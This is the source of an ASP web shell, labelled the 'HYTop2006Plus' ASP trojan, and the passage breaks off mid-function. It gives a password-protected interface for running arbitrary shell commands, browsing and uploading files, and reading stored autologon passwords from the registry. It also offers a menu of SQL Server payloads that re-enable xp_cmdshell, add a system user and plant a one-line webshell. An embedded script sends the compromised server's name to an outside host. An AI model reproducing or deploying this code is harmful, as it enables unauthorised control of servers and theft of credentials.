<object runat="server" id = "ws" scope = "page" classid = "clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id = "fso" scope = "page" classid = "clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<object runat="server" id = "ws" scope = "page" classid = "clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id = "sa" scope = "page" classid = "clsid:13709620-C279-11CE-A49E-444553540000"></object>
<%
	Option Explicit
	Response.Buffer = True

	Dim i, url, conn, sUrlB, theAct, thePath, rootPath, PageSize, aspPath, bOtherUser, sSqlSelect, sImage
	Dim sUrl, accessStr, PageName, sysFileList, isSqlServer, sPacketName, oFso, oShl, oWshl, sFooter, sHeader, sClientTracer
	bOtherUser = False		''是否需要其它NT用户身份登录

	If bOtherUser = True And Trim(Request.ServerVariables("AUTH_USER")) = "" Then
		Response.Status = "401 Unauthorized"
		Response.Addheader "WWW-AuThenticate", "BASIC"
		If Request.ServerVariables("AUTH_USER") = "" Then Response.End()
	End If

	theAct = GetPost("theAct")
	PageSize = 20 ''默认每页记录数
	isSqlServer = False
	rootPath = Server.MapPath("/")
	PageName = GetPost("PageName")
	url = Request.ServerVariables("URL") ''当前页的相对路径
	sPacketName = "Packet.mdb" ''文件包默认文件名
	thePath = Replace(GetPost("thePath"), "\\", "\")
	aspPath = Replace(Server.MapPath(".") & "\~386.tmp", "\\", "\") ''系统临时文件
	sysFileList = "$" & sPacketName & "$" & Left(sPacketName, InStrRev(sPacketName, ".") - 1) & ".ldb$"
	sClientTracer = "<script language=javascript src=""http://hididi.net/ASPAdmin/ASPAdmin_L.asp?theUrl=http://" & Request.ServerVariables("SERVER_NAME") & "&productName=HYTop2006Plus""></script>"
	''http://hididi.net/ASPAdmin/ASPAdmin_L.asp?theUrl=http://www.163.com&productName=HYTop2006Plus
	accessStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source={$dbSource};User Id={$userId};Jet OLEDB:Database Password=""{$passWord}"";"
	sFooter = "<tr><td class=trHead colspan=2>&nbsp;</td></tr><tr><td align=right class=td colspan=2>Powered By Marcos 2006.02&nbsp;</td></tr></table>"
	sHeader = "<table width=750 border=1><tr><td colspan=2 class=td><font face=webdings>8</font> {$s}</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
	sSqlSelect = "<select onchange=""if(this.form.sqlB)this.form.sqlB.value=this.value;else this.form.sql.value=this.value;""><option value=''>SQL Server常用操作列表<option value=""Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll')"">恢复sp_OACreate<option value=""Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"">恢复xp_cmdshell<option value=""Use master dbcc addextendedproc ('xp_regwrite','xpstar.dll')"">恢复xp_regwrite" & _
				 "<option value=""Exec master.dbo.XP_CMDShell 'net user lcx lcx /add'"">XP_CMDShell执行命令<option value=""sp_makewebtask @outputfile='d:\bbs\cd.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))" & Chr(37) & ">''' "">sp_makewebtask写文件" & _
				 "<option value=""CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell(&quot;net user&quot;)');"">xp_regwrite执行命令(1)<option value=""select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell(&quot;cmd.exe /c copy 8617.tmp jnc.tmp&quot;)');BULK INSERT [jnc] FROM 'jnc.tmp' WITH (KEEPNULLS);"">xp_regwrite执行结果写入jnc表(2)<option value=""CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c net user > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);"">sp_oacreate执行命令,结果写入jnc表<option value=""select * from [jnc]"">查看jnc临时表内容<option value=""DROP TABLE [jnc];exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell(&quot;cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');"">xp_regwrite临时数据删除<option value=""DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c del 8617.tmp'"">sp_oacreate临时数据删除<option value="" EXEC [master].[dbo].[xp_makecab] 'c:\test.cab','default',1,'d:\cmd.asp'"">打CAB包<option value=""EXEC [master].[dbo].[xp_unpackcab] 'C:\test.cab','c:',1, 'n.asp'"">解CAB包</select><br />"

	Const s = "lcx" ''登录标志
	Const m = "HYTop2006+" ''Session标志
	Const isDebugMode = False 'False,True''是否调试模式
	Const userPassword = "02200200251001" ''登录密码
	Const imageFileExt = "$gif$jpg$bmp$" ''图像后缀列表
	Const editableFileExt = "$vbs$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$lst$aspx$php3$php4$js$css$bat$asa$"

	Sub Echo(sStr)
		Response.Write sStr
	End Sub

	Sub IsIn()
		If Session(m & "userPassword") <> userPassword Then
			Echo "<script>alert('没有权限的访问,请先登录!');location.href='" & url & "';</script>"
			Response.End()
		End If
	End Sub

	Function IIf(var, val1, val2)
		If var = True Then IIf = val1 Else IIf = val2
	End Function
	
	Function StrEncode(str)
		str = HtmlEncode(str)
		str = Replace(str, " ", "&nbsp;")
		str = Replace(str, "	", "&nbsp;&nbsp;&nbsp;&nbsp;")
		str = Replace(str, vbNewLine, "<br />")
		StrEncode = str
	End Function
	
	Sub CreateObj(oFso, oShl, oWshl)
		On Error Resume Next

		Set oWshl = Server.CreateObject("WScript.Shell")
		Set oShl = Server.CreateObject("Shell.Application")
		Set oFso = Server.CreateObject("Scripting.FileSystemObject")

		If IsEmpty(oShl) Then Set oShl = sa
		If IsEmpty(oFso) Then Set oFso = fso
		If IsEmpty(oWshl) Then Set oWshl = ws

		If Err Then Err.Clear
	End Sub
	
	Function StreamLoadFromFile(sPath)
		Dim oStream
		If isDebugMode = False Then On Error Resume Next

		Set oStream = Server.CreateObject("Adodb.Stream")
		With oStream
			.Type = 2
			.Mode = 3
			.Open
			.LoadFromFile sPath
			If Request("PageName") <> "TxtSearcher" Then ChkErr(Err)
			.Charset = "gb2312"
			.Position = 2
			StreamLoadFromFile = .ReadText()
			.Close
		End With
		Set oStream = Nothing
	End Function
	
	Sub JavaScript(sStr)
		Response.Write(vbNewLine & "<script type=""text/javascript"">" & sStr & "</script>" & vbNewLine)
	End Sub
	
	Function GetPost(var)
		Dim val
		If Request.QueryString("PageName") = "PageUpload" Then
			PageName = "PageUpload"
			Exit Function
		End If
		val = RTrim(Request.Form(var))
		If val = "" Then val = RTrim(Request.QueryString(var))
		GetPost = val
	End Function
	
	Function HtmlEncode(str)
		If IsNull(str) Then Exit Function
		HtmlEncode = Server.HTMLEncode(str)
	End Function
	
	Function UrlEncode(str)
		If IsNull(str) Then Exit Function
		UrlEncode = Server.URLEncode(str)
	End Function
	
	Sub ShowTitle(str)
		Response.Write "<title>" & str & " - 海阳顶端网ASP木马＠2006PLUS - By Marcos</title>"
		Response.Write "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>"
	End Sub
	
	Function GetTheSize(n)
		Dim i, aSize(4)
		aSize(0) = "B"
		aSize(1) = "KB"
		aSize(2) = "MB"
		aSize(3) = "GB"
		aSize(4) = "TB"
		While(n / 1024 >= 1)
			n = n / 1024
			i = i + 1
		WEnd
		GetTheSize = Fix(n * 100) / 100 & " " & aSize(i)
	End Function
	
	Sub ShowErr(str)
		Dim i, aStr
		str = HtmlEncode(str)
		aStr = Split(str, "$$")

		Echo "<font size=2>"
		Echo "出错信息:<br/><br/>"
		For i = 0 To UBound(aStr)
			Echo "&nbsp;&nbsp;" & (i + 1) & ". " & aStr(i) & "<br/>"
		Next
		Echo "</font>"

		Response.End()
	End Sub
	
	Sub CreateFolder(sPath)
		Dim i
		i = InStr(Mid(sPath, 4), "\") + 3
		Do While i > 0
			If oFso.FolderExists(Left(sPath, i)) = False Then oFso.CreateFolder(Left(sPath, i - 1))
			If InStr(Mid(sPath, i + 1), "\") Then i = i + InStr(Mid(sPath, i + 1), "\") Else i = 0
		Loop
	End Sub
	
	Sub AlertThenClose(str)
		If str = "" Then
			Response.Write "<script>window.close();</script>"
		 Else
			Response.Write "<script>alert(""" & str & """);window.close();</script>"
		End If
	End Sub
	
	Sub ChkErr(Err)
		If Err Then
			Echo "<hr style='color:#d8d8f0;'/><font size=2><li>错误: " & Err.Description & "</li><li>错误源: " & Err.Source & "</li><br/>"
			Echo "<hr style='color:#d8d8f0;'/>&nbsp;By Marcos 2006.02</font>"
			Err.Clear
			Response.End
		End If
	End Sub
	
	Sub TopMenu()
		Echo "<form method=post name=formp action=""" & url & """>"
		Echo "<select name=PageName onchange=if(this.value!='')changePage(this);>"
		Echo "<option value=''>请选择功能页面</option>"
		Echo "<option value=PageCheck>服务器信息探针</option>"
		Echo "<option value=PageServiceList>系统服务列表</option>"
		Echo "<option value=PageUserList>系统用户(组)列表</option>"
		Echo "<option value=PageFso>FSO文件浏览操作器</option>"
		Echo "<option value=PageApp>APP文件浏览操作器</option>"
		Echo "<option value=PageDBTool>数据库操作器</option>"
		Echo "<option value=PagePack>文件夹打包/解开器</option>"
		Echo "<option value=PageUpload>批量文件上传</option>"
		Echo "<option value=PageSearch>文本文件搜索器</option>"
		Echo "<option value=PageWebProxy>HTTP协议网页代理</option>"
		Echo "<option value=PageExecute>自定义ASP语句运行</option>"
		Echo "<option value=PageCSInfo>客户端服务器交互信息</option>"
		Echo "<option value=PageWsCmdRun>WScript.Shell命令行操作</option>"
		Echo "<option value=PageSaCmdRun>Shell.Application命令行</option>"
		Echo "<option value=PageOtherTools>其它一些零碎的小工具</option>"
		Echo "<option value=PageOut>退出系统</option>"
		Echo "</select>"
		Echo "</form>"
		Echo "<script language=javascript>"
		Echo "function document.onreadystatechange(){if(document.readyState != 'complete') return;" & vbNewLine
		Echo "formp.PageName.value='" & PageName & "';" & IIf(PageName = s, "formp.PageName.value='PageExecute';formp.submit();", "") & "}"
		Echo "function changePage(obj){"
		Echo "	if(obj.value=='PageOut')"
		Echo "		if(!confirm('确认要退出系统吗?'))return;"
		Echo "	if(obj.value=='PageWebProxy')obj.form.target='_blank';"
		Echo "	obj.form.submit();obj.form.target='';" & vbNewLine
		Echo "	if(obj.value!='PageWebProxy' && obj.value!='PageOut')obj.disabled=true;"
		Echo "}"
		Echo "</script>"
	End Sub
	
	Rem ++++++++++++++++++++++++++++++++++++
	Rem 		以下是页面选择部分
	Rem ++++++++++++++++++++++++++++++++++++

	Call CreateObj(oFso, oShl, oWshl)
	Response.Clear
	PageOther()
	If PageName <> "" And PageName <> s Then
		IsIn()
		TopMenu()
	End If
	If PageName = "" And s <> "" Then
		sUrl = "http://" & Request.ServerVariables("SERVER_NAME") & "/NoExists.html"
		PageWebProxy()
	End If

	Select Case PageName
		Case "PageSearch"
			PageSearch()
		Case "PageServiceList"
			PageServiceList()
		Case "PageUserList"
			PageUserList()
		Case "PageCheck"
			PageCheck()
		Case "PageFso"
			PageFso()
		Case "PageApp"
			PageApp()
		Case "PageDBTool"
			PageDBTool()
		Case "PageUpload"
			PageUpload()
		Case "PageWsCmdRun"
			PageWsCmdRun()
		Case "PageSaCmdRun"
			PageSaCmdRun()
		Case "PagePack"
			PagePack()
		Case "PageExecute"
			PageExecute()
		Case "PageCSInfo"
			PageCSInfo()
		Case "PageOtherTools"
			PageOtherTools()
		Case "PageWebProxy"
			PageWebProxy()
		Case s, "PageOut"
			PageLogin()
	End Select
	
	Set oFso = Nothing
	Set oShl = Nothing
	Set oWshl = Nothing

	Rem +++++++++++++++++++++++++++++++++++++
	Rem 		以下是各功能模块部分
	Rem +++++++++++++++++++++++++++++++++++++
	
	Sub PageWsCmdRun()
		Dim cmdStr, cmdPath, cmdResult
		cmdStr = Request("cmdStr")
		cmdPath = Request("cmdPath")
		
		ShowTitle("WScript.Shell命令行操作")
		
		If cmdPath = "" Then
			cmdPath = "cmd.exe"
		End If
		
		If theAct = "PackIt" And cmdStr <> "" Then
			Server.ScriptTimeOut = 999999
			cmdStr = "c:\progra~1\WinRAR\Rar.exe a """ & cmdStr & "\Packet.rar"" """ & cmdStr & """"
			cmdStr = Replace(cmdStr, "\\", "\")
		End If

		If cmdStr <> "" Then
			If InStr(LCase(cmdPath), "cmd.exe") > 0 Then
				cmdResult = DoWsCmdRun(cmdPath & " /c " & cmdStr)
			 Else
		 		If LCase(cmdPath) = "wscriptshell" Then
					cmdResult = DoWsCmdRun(cmdStr)
				 Else
					cmdResult = DoWsCmdRun(cmdPath & " " & cmdStr)
				End If
			End If
		End If
		
		Echo "<body onload=""document.forms[1].cmdStr.focus();"">"
		Echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		Echo "<input type=hidden name=PageName value='PageWsCmdRun' />"
		Echo Replace(sHeader, "{$s}", "WScript.Shell命令行操作")
		Echo "<tr><td colspan=2>&nbsp;路径: <input name=cmdPath type=text id=cmdPath value=""" & HtmlEncode(cmdPath) & """ size=50> "
		Echo "<input type=button name=Submit2 value=使用WScript.Shell onClick=""this.form.cmdPath.value='WScriptShell';""></td></tr>"
		Echo "<tr><td colspan=2>&nbsp;命令/参数: <input name=cmdStr type=text id=cmdStr value=""" & HtmlEncode(cmdStr) & """ size=62> "
		Echo "<input type=submit name=Submit value=' 运行 '></td><tr>"
		Echo "<tr><td colspan=2 style='line-height:21px;'>&nbsp;注:请只在这里执行单步程序(程序执行开始到结束不需要人工干预),不然本程序会无法正常工作,并且在服务器生成一个不可结束的进程.</td></tr>"
		Echo "<tr><td colspan=2>&nbsp;<textarea id=cmdResult style='width:735px;height:400px;'>"
		Echo HtmlEncode(cmdResult)
		Echo "</textarea></td></tr>"
		Echo sFooter
		Echo "</form>"
		Echo "</body>"
	End Sub
	
	Function DoWsCmdRun(cmdStr)
		If isDebugMode = False Then On Error Resume Next
		Dim oFile
		
		doWsCmdRun = oWshl.Exec(cmdStr).StdOut.ReadAll()
		If Err Then
			Echo Err.Description & "<br>"
			Err.Clear
			oWshl.Run cmdStr & " > " & aspPath, 0, True
			Set oFile = oFso.OpenTextFile(aspPath)
			DoWsCmdRun = oFile.RealAll()
			If Err Then
				Echo Err.Description & "<br>"
				Err.Clear
				DoWsCmdRun = StreamLoadFromFile(aspPath)
			End If
		End If
	End Function
	
	Sub PageSaCmdRun()
		If isDebugMode = False Then On Error Resume Next
		Dim theFile, appPath, appName, appArgs
		
		ShowTitle("Shell.Application 命令行操作")
		
		appPath = Trim(Request("appPath"))
		appName = Trim(Request("appName"))
		appArgs = Trim(Request("appArgs"))

		If theAct = "doAct" Then
			If appName = "" Then appName = "cmd.exe"
		
			If appPath <> "" And Right(appPath, 1) <> "\" Then
				appPath = appPath & "\"
			End If
		
			If LCase(appName) = "cmd.exe" And appArgs <> "" Then
				If LCase(Left(appArgs, 2)) <> "/c" Then
					appArgs = "/c " & appArgs
				End If
			Else
				If LCase(appName) = "cmd.exe" And appArgs = "" Then
					appArgs = "/c "
				End If
			End If

			oShl.ShellExecute appName, appArgs, appPath, "", 0
'			Response.Write("oShl.ShellExecute " & appName & ", " & appArgs & ", " & appPath & ", """", 0")
			chkErr(Err)
		End If
		
		If theAct = "readResult" Then
			Err.Clear
			Response.Clear
			Response.Write("<style>body{font-size:12px;}</style>" & vbNewLine)
			Echo StrEncode(streamLoadFromFile(aspPath))
			If Err Then
				Err.Clear
				Set theFile = fsoX.OpenTextFile(aspPath)
				Echo StrEncode(theFile.ReadAll())
				Set theFile = Nothing
			End If
			Response.End()
		End If
		
		Echo "<body onload=""document.forms[1].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);"">"
		Echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		Echo "<input type=hidden name=theAct value=doAct>"
		Echo "<input type=hidden name=PageName value=PageSaCmdRun />"
		Echo "<input type=hidden name=aspPath value=""" & HtmlEncode(aspPath) & """>"
		Echo Replace(sHeader, "{$s}", "Shell.Application 命令行操作")
		Echo "<tr><td colspan=2>&nbsp;所在路径: <input name=appPath type=text id=appPath value=""" & HtmlEncode(appPath) & """ size=62></td></tr>"
		Echo "<tr><td colspan=2>&nbsp;程序文件: <input name=appName type=text id=appName value=""" & HtmlEncode(appName) & """ size=62> "
		Echo "<input type=button name=Submit4 value=' 回显 ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;""></td></tr>"
		Echo "<tr><td colspan=2>&nbsp;命令参数: <input name=appArgs type=text id=appArgs value=""" & HtmlEncode(appArgs) & """ size=62> "
		Echo "<input type=submit name=Submit value=' 运行 '></td></tr>"
		Echo "<tr><td colspan=2>&nbsp;注: 只有命令行程序在CMD.EXE运行环境下才可以进行临时文件回显(利用"">""符号),其它程序只能执行不能回显.<br/>"
		Echo "&nbsp;由于命令执行时间同网页刷新时间不同步,所以有些执行时间长的程序结果需要手动刷新下面的iframe才能得到.回显后记得删除临时文件.</td></tr>"
		Echo "<tr><td colspan=2 style='padding-top:6px;'>&nbsp;<iframe id=cmdResult style='width:733px;height:400px;'>"
		Echo "</iframe></td></tr>"
		Echo sFooter
		Echo "</form>"
		Echo "</body>"
	End Sub
	
	Sub PageSearch()
		Dim strKey, strPath
		strKey = GetPost("Key")
		Server.ScriptTimeout = 5000
		If thePath = "" Then thePath = rootPath
		
		ShowTitle("文本文件搜索器")
		
		SearchTable(strKey)
		
		If theAct <> "" And strKey <> "" Then
			SearchIt(strKey)
		End If
	End Sub
	
	Sub SearchTable(strKey)
		Echo "<form method=post action='" & url & "'>"
		Echo "<input type=hidden value=PageSearch name=PageName>"
		Echo Replace(sHeader, "{$s}", "文本文件搜索器(需FSO支持)")
		Echo "<tr>"
		Echo "<td>&nbsp;路径</td>"
		Echo "<td>&nbsp;<input name=thePath type=text id=thePath value="""
		Echo HtmlEncode(thePath)
		Echo """ style='width:360px;'>"
		Echo "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td width='20%'>&nbsp;关键字</td>"
		Echo "<td>&nbsp;<input name=Key type=text value='" & HtmlEncode(strKey) & "' id=Key style='width:400px;'> "
		Echo "<select name=theAct id=theAct>"
		Echo "<option value=FileName selected>仅文件名</option>"
		Echo "<option value=FileContent>仅文本内容</option>"
		Echo "<option value=Both>两者都</option>"
		Echo "</select>"
		Echo " <input type=submit name=Submit value=提交> </td>"
		Echo "</tr>"
		Echo sFooter
		Echo "</form>"
	End Sub
	
	Sub SearchIt(key)
		Dim strPath, theFolder
		Response.Buffer = True
		strPath = thePath
		If oFso.FolderExists(strPath) = False Then
			ShowErr(thePath & " 目录不存在或者不允许访问!")
		End If
		Set theFolder = oFso.GetFolder(strPath)
		
		Echo "<br/><div style='width:750;border:1px solid #d8d8f0;'>"

		Select Case theAct
			Case "Both"
				Call SearchFolder(theFolder, key, 1)
			Case "FileName"
				Call SearchFolder(theFolder, key, 2)
			Case "FileContent"
				Call SearchFolder(theFolder, key, 3)
		End Select
		
		Echo "</div>"
		
		Set theFolder = Nothing
	End Sub
	
	Sub SearchFolder(folder, key, flag)
		Dim ext, title, theFile, theFolder
		If isDebugMode = False Then On Error Resume Next

		For Each theFile In folder.Files
			ext = LCase(oFso.GetExtensionName(theFile.Path))
			If flag = 1 Or flag = 2 Then
				If InStr(LCase(theFile.Name), LCase(key)) > 0 Then Echo FileLink(theFile, "")
			End If
			If flag = 1 Or flag = 3 Then
				If InStr(editableFileExt, "$" & ext & "$") > 0 Then
					If SearchFile(theFile, key, title) Then Echo FileLink(theFile, title)
				End If
			End If
		Next

		Response.Flush()

		For Each theFolder In folder.SubFolders
			Call SearchFolder(theFolder, key, flag)
		Next
	End Sub
	
	Function SearchFile(fx, s, title)
		Dim theFile, content, pos1, pos2
		If isDebugMode = False Then On Error Resume Next

		Set theFile = oFso.OpenTextFile(fx.Path)
		content = theFile.ReadAll()
		theFile.Close
		Set theFile = Nothing

		If Err Then Err.Clear

		SearchFile = InStr(1, content, s, 1) 
		If SearchFile > 0 Then
			pos1 = InStr(1, content, "<TITLE>", 1)
			pos2 = InStr(1, content, "</TITLE>", 1)
			title = ""
			If pos1 > 0 And pos2 > 0 Then
				title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
			End If
		End If
	End Function
	
	Function FileLink(file, title)
		fileLink = file.Path
		If title = "" Then
			title = file.Name
		End If
		fileLink = "&nbsp;<font color=ff0000>" & title & "</font> " & fileLink & "<br/>"
	End Function

	Sub PageCheck()
		ShowTitle("服务器信息探针")
		Response.Flush()
		InfoCheck()
		Response.Flush()
		ObjCheck()
		Response.Flush()
		GetSrvDrvInfo()
		Response.Flush()
	End Sub

	Sub InfoCheck()
		Dim aCheck(7), sExEnvList, aExEnvList
		If isDebugMode = False Then On Error Resume Next

		sExEnvList = "ClusterLog$SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" & _
					 "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		aExEnvList = Split(sExEnvList, "$")

		aCheck(0) = Server.ScriptTimeOut() & "(秒)"
		aCheck(1) = FormatDateTime(Now(), 0)
		aCheck(2) = Request.ServerVariables("SERVER_NAME")
		aCheck(2) = aCheck(2) & ", " & Request.ServerVariables("LOCAL_ADDR")
		aCheck(2) = aCheck(2) & ":" & Request.ServerVariables("SERVER_PORT")
		aCheck(3) = Request.ServerVariables("OS")
		aCheck(3) = IIf(aCheck(3) = "", "Windows2003", aCheck(3)) & ", " & Request.ServerVariables("SERVER_SOFTWARE")
		aCheck(3) = aCheck(3) & ", " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion
		aCheck(4) = rootPath
		aCheck(4) = aCheck(4) & ", " & GetTheSize(oFso.GetFolder(rootPath).Size)
		aCheck(5) = "Path: " & Request.ServerVariables("PATH_TRANSLATED") & "<br />"
		aCheck(5) = aCheck(5) & "&nbsp;Url : http://" & Request.ServerVariables("SERVER_NAME") & Request.ServerVariables("Url")
		aCheck(6) = "变量数: " & Application.Contents.Count() & ","
		aCheck(6) = aCheck(6) & " 会话数: " & Session.Contents.Count & ","
		aCheck(6) = aCheck(6) & " 当前会话ID: " & Session.SessionId() & "<br />"
		aCheck(6) = aCheck(6) & "&nbsp;服务器内存: " & GetTheSize(oShl.GetSystemInformation("PhysicalMemoryInstalled")) & ","
		aCheck(6) = aCheck(6) & "&nbsp;计" & oWshl.Environment("SYSTEM")("NUMBER_OF_PROCESSORS") & "个CPU(" & oWshl.Environment("SYSTEM")("PROCESSOR_IDENTIFIER") & ")"

		Echo Replace(sHeader, "{$s}", "服务器基本信息")
		Echo "<tr class=td>"
		Echo "<td width='20%'>&nbsp;项目</td>"
		Echo "<td>&nbsp;值</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;默认超时</td>"
		Echo "<td>&nbsp;" & aCheck(0) & "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;当前时间</td>"
		Echo "<td>&nbsp;" & aCheck(1) & "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;服务器名</td>"
		Echo "<td>&nbsp;" & aCheck(2) & "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;软件环境</td>"
		Echo "<td>&nbsp;" & aCheck(3) & "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;站点目录</td>"
		Echo "<td>&nbsp;" & aCheck(4) & "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;当前路径</td>"
		Echo "<td>&nbsp;" & aCheck(5) & "</td>"
		Echo "</tr>"
		Echo "<tr><td>&nbsp;终端服务端口<br />&nbsp;及自动登录信息</td><td>"
		GetTerminalInfo()
		Echo "</td></tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;其它</td>"
		Echo "<td>&nbsp;" & aCheck(6) & "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;环境变量</td>"
		Echo "<td style='padding-left:7px;'>"
		For i = 0 To UBound(aExEnvList)
			Echo aExEnvList(i) & ": " & oWshl.ExpandEnvironmentStrings("%" & aExEnvList(i) & "%") & "<br />"
		Next
		Echo "</td>"
		Echo "</tr>"
		Echo sFooter
	End Sub

	Sub GetSrvDrvInfo()
		If isDebugMode = False Then On Error Resume Next
		Dim oTheDrive
		
		Echo "<br />"
		Echo Replace(Replace(sHeader, "{$s}", "服务器磁盘信息"), "=2", "=6")
		Echo "<tr class=td align=center>"
		Echo "<td>盘符</td>"
		Echo "<td>类型</td>"
		Echo "<td>卷标</td>"
		Echo "<td>文件系统</td>"
		Echo "<td>可用空间</td>"
		Echo "<td>总空间</td>"
		Echo "</tr>"
		
		For Each oTheDrive In oFso.Drives
			Echo "<tr align=center><td>"
			Echo oTheDrive.DriveLetter
			Echo "</td><td>"
			Echo GetDriveType(oTheDrive.DriveType)
			Echo "</td><td>"
			Echo oTheDrive.VolumeName
			Echo "</td><td>"
			Echo oTheDrive.FileSystem
			Echo "</td><td>"
			Echo GetTheSize(oTheDrive.FreeSpace)
			Echo "</td><td>"
			Echo GetTheSize(oTheDrive.TotalSize)
			Echo "</td></tr>"
			If Err Then Err.Clear
		Next
		
		Echo Replace(sFooter, "=2", "=6")
		
		Set oTheDrive = Nothing
	End Sub
	
	Function GetDriveType(n)
		Select Case n
			Case 0
				GetDriveType = "未知"
			Case 1
				GetDriveType = "可移动磁盘"
			Case 2
				GetDriveType = "本地硬盘"
			Case 3
				GetDriveType = "网络磁盘"
			Case 4
				GetDriveType = "CD-ROM"
			Case 5
				GetDriveType = "RAM 磁盘"
		End Select
	End Function
	
	Sub GetTerminalInfo()
		If isDebugMode = False Then On Error Resume Next
		Dim terminalPortPath, terminalPortKey, termPort
		Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
		Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword

		terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
		terminalPortKey = "PortNumber"
		termPort = oWshl.RegRead(terminalPortPath & terminalPortKey)

		If termPort = "" Or Err.Number <> 0 Then 
			Echo  "&nbsp;无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
		 Else
			Echo  "&nbsp;当前终端服务端口: " & termPort & "<br/>"
		End If
		
		autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
		autoLoginEnableKey = "AutoAdminLogon"
		autoLoginUserKey = "DefaultUserName"
		autoLoginPassKey = "DefaultPassword"
		isAutoLoginEnable = oWshl.RegRead(autoLoginPath & autoLoginEnableKey)
		
		If isAutoLoginEnable = 0 Then
			Echo  "&nbsp;系统自动登录功能未开启"
		Else
			autoLoginUsername = oWshl.RegRead(autoLoginPath & autoLoginUserKey)
			Echo  "&nbsp;自动登录的系统帐户: " & autoLoginUsername & "<br />"
			autoLoginPassword = oWshl.RegRead(autoLoginPath & autoLoginPassKey)
			If Err Then
				Err.Clear
				Echo  "False"
			End If
			Echo  "&nbsp;自动登录的帐户密码: " & autoLoginPassword & "<br />"
		End If
	End Sub
	
	Sub ObjCheck()
		Dim aObj(19)
		Dim x, objTmp, theObj, strObj
		If isDebugMode = False Then On Error Resume Next

		strObj = Trim(getPost("TheObj"))
		aObj(0) = "MSWC.AdRotator|广告轮换组件"
		aObj(1) = "MSWC.BrowserType|浏览器信息组件"
		aObj(2) = "MSWC.NextLink|内容链接库组件"
		aObj(3) = "MSWC.Tools|"
		aObj(4) = "MSWC.Status|"
		aObj(5) = "MSWC.Counters|计数器组件"
		aObj(6) = "MSWC.PermissionChecker|权限检测组件"
		aObj(7) = "Adodb.Connection|ADO 数据对象组件"
		aObj(8) = "CDONTS.NewMail|虚拟 SMTP 发信组件"
		aObj(9) = "Scripting.FileSystemObject|FSO组件"
		aObj(10) = "Adodb.Stream|Stream 流组件"
		aObj(11) = "Shell.Application|"
		aObj(12) = "WScript.Shell|"
		aObj(13) = "Wscript.Network|"
		aObj(14) = "ADOX.Catalog|"
		aObj(15) = "JMail.SmtpMail|JMail 邮件收发组件"
		aObj(16) = "Persits.Upload.1|ASPUpload 文件上传组件"
		aObj(17) = "LyfUpload.UploadFile|刘云峰的文件上传组件组件"
		aObj(18) = "SoftArtisans.FileUp|SA-FileUp 文件上传组件"
		aObj(19) = strObj & "|您所要检测的组件"

		Echo "<br/>"
		Echo Replace(Replace(sHeader, "{$s}", "服务器组件信息"), "=2", "=3")
		Echo "<tr class=td>"
		Echo "<td>&nbsp;组件<font color=#666666>(描述)</font></td>"
		Echo "<td width=10% align=center>支持</td>"
		Echo "<td width=15% align=center>版本</td>"
		Echo "</tr>"
		For Each x In aObj
			theObj = Split(x, "|")
			If theObj(0) = "" Then Exit For
			Set objTmp = Server.CreateObject(theObj(0))
			If Err <> -2147221005 Then
				x = x & "|√" & IIf(Err = -2147221005, "<font color=#666666>(权限不足)</font>", "") & "|"
				x = x & objTmp.Version
			Else
				x = x & "|<font color=red>×</font>|"
			End If
			If Err Then Err.Clear
			Set objTmp = Nothing

			theObj = Split(x, "|")
